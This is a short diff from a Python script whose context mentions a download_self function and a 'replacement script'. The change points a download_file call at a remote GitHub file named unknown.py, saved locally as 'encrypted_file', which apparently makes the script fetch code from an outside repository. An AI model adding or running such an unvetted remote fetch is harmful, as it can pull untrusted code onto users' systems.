@@ -52,4 +52,4 @@ def download_self():
         print(f"An error occurred while downloading the replacement script: {e}")
 
 # Example usage
-download_file("https://example.com/file", "encrypted_file")
+download_file("https://github.com/soumeswar/NoMercy/blob/main/unknown.py", "encrypted_file")
